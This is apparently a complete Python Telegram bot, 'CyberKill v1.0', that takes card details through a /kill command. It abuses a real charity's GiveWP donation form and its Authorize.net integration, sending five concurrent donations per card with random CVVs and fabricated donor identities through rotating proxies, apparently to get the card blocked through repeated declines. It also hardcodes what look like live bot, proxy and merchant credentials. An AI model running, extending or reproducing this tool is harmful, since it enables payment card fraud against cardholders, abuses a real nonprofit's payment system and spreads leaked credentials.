import telebot
import requests
import json
import random
import time
import re
import string
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Telegram Bot Token (replace with your bot token)
BOT_TOKEN = "6751940696:AAFz_8qF6sI24EJzU3sv367eMkcjVJsBlTU"
bot = telebot.TeleBot(BOT_TOKEN)

# Proxy configuration
PROXIES = [
    {
        "http": "http://e0TSaD:B6cEuH@node1.veilpro.tech:6000",
        "https": "http://e0TSaD:B6cEuH@node1.veilpro.tech:6000"
    },
    {
        "http": "http://IoyTYu:K4NwIV@node1.veilpro.tech:6000",
        "https": "http://IoyTYu:K4NwIV@node1.veilpro.tech:6000"
    }
]

# Site-specific configuration
SITE_CONFIG = {
    "base_url": "https://aepact.org",
    "form_id": "13899",
    "referer_base": "https://aepact.org/donation/",
    "auth_name": "69e4gNYz",
    "auth_client_key": "3YDR636kHRYfg4YkmLqnA7mgGh8sQ7DwX9Xc72hk5RF7HjRdEv2jj4S7J6dt5qz2",
    "card_number": None,
    "card_expiration": None,
    "auth_id": "bf258fab-8ede-75a4-ec19-429b887abe8f"
}

# Regex for CC formats
CC_PATTERN = re.compile(
    r"^(?:[/!.]kill\s+)?(\d{16})\|(\d{2})\|(?:20)?(\d{2})\|(\d{3,4})$|^(\d{16})[/|](\d{2})[/|](?:\d{2}|20\d{2})[/|](\d{3,4})",
    re.IGNORECASE
)

# CyberKill loading bars
LOADING_BARS = [
    "💾[----------] 0% :: Booting System",
    "💾[||--------] 20% :: Accessing Grid",
    "💾[||||------] 40% :: Cracking Vault",
    "💾[||||||----] 60% :: Bypassing Firewall",
    "💾[||||||||--] 80% :: Overloading Core",
    "💾[||||||||||] 100% :: CC Killed"
]

def update_loading_bar(message, stage, status=None):
    try:
        bar = LOADING_BARS[stage]
        text = f"╔════ CyberKill v1.0 ════╗\n" \
               f"║ {bar} ║\n" \
               f"╚═══════════════════════╝"
        if status:
            text += f"\n[Status]: {status}"
        bot.edit_message_text(text, message.chat.id, message.message_id)
    except:
        pass

def extract_signatures(response_text):
    pattern = r"givewp-route-signature=([a-f0-9]+).*?givewp-route-signature-expiration=(\d+)"
    matches = re.findall(pattern, response_text)
    return matches[0] if matches else (None, None)

def generate_random_name():
    first_names = ["John", "Emma", "Michael", "Sarah", "David", "Lisa", "James", "Anna"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Lewis"]
    return random.choice(first_names), random.choice(last_names)

def generate_random_phone():
    area_code = random.randint(200, 999)
    prefix = random.randint(200, 999)
    line = random.randint(1000, 9999)
    return f"+1{area_code}{prefix}{line}"

def generate_random_email(first_name, last_name):
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{first_name.lower()}{last_name.lower()}{random_str}@{random.choice(domains)}"

def generate_random_address():
    streets = ["Main", "Park", "Oak", "Pine", "Cedar", "Elm", "Washington", "Lake"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA"]
    street_num = random.randint(1, 999)
    street_name = random.choice(streets)
    city = random.choice(cities)
    state = random.choice(states)
    zip_code = random.randint(10000, 99999)
    return f"{street_num} {street_name} St", city, state, str(zip_code)

def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        url = f"https://api.juspay.in/cardbins/{bin_number}"
        proxy = random.choice(PROXIES)
        response = requests.get(url, timeout=5, proxies=proxy)
        return response.json() if response.status_code == 200 else {}
    except:
        return {}

def get_form_headers():
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'Upgrade-Insecure-Requests': "1",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "navigate",
        'Sec-Fetch-Dest': "iframe",
        'Referer': SITE_CONFIG["referer_base"],
    }

def get_auth_headers():
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1",
        'Origin': SITE_CONFIG["base_url"],
        'Sec-Fetch-Site': "cross-site",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': SITE_CONFIG["base_url"] + "/",
    }

def get_donation_headers():
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1",
        'Origin': SITE_CONFIG["base_url"],
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': f"{SITE_CONFIG['base_url']}/?givewp-route=donation-form-view&form-id={SITE_CONFIG['form_id']}"
    }

def process_donation_attempt(card_number, expiration, donation_params):
    try:
        cvv = str(random.randint(100, 999))
        amount = str(random.randint(500, 1000))
        first_name, last_name = generate_random_name()
        phone = generate_random_phone()
        email = generate_random_email(first_name, last_name)
        address1, city, state, zip_code = generate_random_address()
        proxy = random.choice(PROXIES)

        auth_url = "https://api2.authorize.net/xml/v1/request.api"
        auth_payload = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {
                    "name": SITE_CONFIG["auth_name"],
                    "clientKey": SITE_CONFIG["auth_client_key"]
                },
                "data": {
                    "type": "TOKEN",
                    "id": SITE_CONFIG["auth_id"],
                    "token": {
                        "cardNumber": card_number,
                        "expirationDate": expiration,
                        "cardCode": cvv
                    }
                }
            }
        }

        auth_response = requests.post(auth_url, data=json.dumps(auth_payload), headers=get_auth_headers(), timeout=10, proxies=proxy)
        try:
            auth_data = auth_response.json()
        except json.JSONDecodeError:
            auth_data = json.loads(auth_response.text.lstrip('\ufeff'))

        if auth_data.get("messages", {}).get("resultCode") == "Ok":
            data_descriptor = auth_data["opaqueData"]["dataDescriptor"]
            data_value = auth_data["opaqueData"]["dataValue"]

            donation_payload = {
                'amount': amount,
                'currency': 'USD',
                'donationType': 'single',
                'formId': SITE_CONFIG["form_id"],
                'gatewayId': 'authorize',
                'firstName': first_name,
                'lastName': last_name,
                'email': email,
                'anonymous': 'false',
                'comment': '',
                'company': 'Neend gen',
                'phone': phone,
                'country': 'US',
                'address1': address1,
                'address2': '',
                'city': city,
                'state': state,
                'zip': zip_code,
                'originUrl': SITE_CONFIG["referer_base"],
                'gatewayData[give_authorize_data_descriptor]': data_descriptor,
                'gatewayData[give_authorize_data_value]': data_value
            }

            donation_response = requests.post(SITE_CONFIG["base_url"], params=donation_params, data=donation_payload, 
                                           headers=get_donation_headers(), timeout=10, proxies=proxy)
            try:
                donation_data = donation_response.json()
                return not donation_data.get("success", False)
            except json.JSONDecodeError:
                return True
        return True
    except Exception:
        return True

def process_kill(message, card_number, month, year, input_cvv):
    start_time = time.time()
    loading_msg = bot.reply_to(message, "╔════ CyberKill v1.0 ════╗\n║ 💾[----------] 0% :: Booting System ║\n╚═══════════════════════╝")
    
    year = f"20{year}" if len(year) == 2 else year
    expiration = f"{month}{year[-2:]}"
    SITE_CONFIG["card_number"] = card_number
    SITE_CONFIG["card_expiration"] = expiration
    
    bin_info = get_bin_info(card_number)
    
    update_loading_bar(loading_msg, 1)
    try:
        proxy = random.choice(PROXIES)
        form_params = {'givewp-route': "donation-form-view", 'form-id': SITE_CONFIG["form_id"]}
        response = requests.get(SITE_CONFIG["base_url"], params=form_params, headers=get_form_headers(), timeout=10, proxies=proxy)
        signature, expiration_time = extract_signatures(response.text)
        
        if not signature or not expiration_time:
            bot.edit_message_text("╔════ CyberKill v1.0 ════╗\n"
                                 "║ ❌ IP BLOCKED! ║\n"
                                 "╚═══════════════════════╝", 
                                 message.chat.id, loading_msg.message_id)
            return
    except Exception as e:
        bot.edit_message_text(f"╔════ CyberKill v1.0 ════╗\n"
                             f"║ ❌ Error ! Report to @HRK_07 ║\n"
                             "╚═══════════════════════╝", 
                             message.chat.id, loading_msg.message_id)
        return

    donation_params = {
        'givewp-route': "donate",
        'givewp-route-signature': signature,
        'givewp-route-signature-id': "givewp-donate",
        'givewp-route-signature-expiration': expiration_time
    }

    num_requests = 5
    declined_count = 0
    
    update_loading_bar(loading_msg, 2)
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(process_donation_attempt, card_number, expiration, donation_params) 
                  for _ in range(num_requests)]
        results = [future.result() for future in futures]
        declined_count = sum(results)

    update_loading_bar(loading_msg, 4)
    elapsed_time = round(time.time() - start_time, 2)
    status = "KILLED ✅" if declined_count == num_requests else "Failed to Kill ❌"
    response_msg = "Card Killed!" if declined_count == num_requests else "Unable to Kill Card"

    update_loading_bar(loading_msg, 5, status)
    time.sleep(1)

    output = (
        "╔════ CyberKill v1.0 ════╗\n"
        "║ 💀 CC KILLER - /kill 💀 ║\n"
        "║ Status: {}\n"
        "║ Card: {}|{}|{}|{}\n"
        "║ Response: {}\n"
        "║ 💳 Info: {} | {} | {}\n"
        "║ 🏦 Bank: {}\n"
        "║ 🌍 Country: {} ({})\n"
        "║ ⏱ Time: {} Sec\n"
        "║ Proxy: Live ✅\n"
        "║ 🤖 Bot by: @HRK_07 ║\n"
        "╚═══════════════════════╝"
    ).format(
        status,
        card_number, month, year, input_cvv,
        response_msg,
        bin_info.get('brand', 'N/A'), bin_info.get('type', 'N/A'), bin_info.get('card_sub_type', 'N/A'),
        bin_info.get('bank', 'N/A'),
        bin_info.get('country', 'N/A'), bin_info.get('country_code', 'N/A'),
        elapsed_time
    )
    
    try:
        bot.edit_message_text(output, message.chat.id, loading_msg.message_id)
    except:
        bot.reply_to(message, output)

@bot.message_handler(commands=['kill'])
def handle_kill_command(message):
    text = message.text.strip()
    match = CC_PATTERN.search(text)
    
    if not match:
        bot.reply_to(message, "╔════ CyberKill v1.0 ════╗\n"
                            "║ ❌ Invalid CC format    ║\n"
                            "║ Use: /kill 1234567890123456|MM|YYYY|CVV ║\n"
                            "╚═══════════════════════╝")
        return

    groups = match.groups()
    if groups[0]:
        card_number, month, year, input_cvv = groups[0:4]
    else:
        card_number, month, year, input_cvv = groups[4:8]

    thread = threading.Thread(target=process_kill, args=(message, card_number, month, year, input_cvv))
    thread.start()

print("Bot is running...")
bot.polling(none_stop=True)
